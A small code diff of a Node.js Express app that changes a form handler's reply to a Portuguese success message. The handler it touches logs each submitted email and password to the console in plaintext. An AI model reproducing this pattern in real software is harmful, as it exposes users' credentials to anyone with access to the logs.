@@ -20,7 +20,7 @@ app.get('/', (req, res) => {
 app.post('/submit', (req, res) => {
     const { email, password } = req.body;
     console.log(`Email: ${email}, Password: ${password}`);
-    res.send('Form data received');
+    res.send('Dados recebidos com sucesso!');
 });
 
 app.listen(PORT, () => {
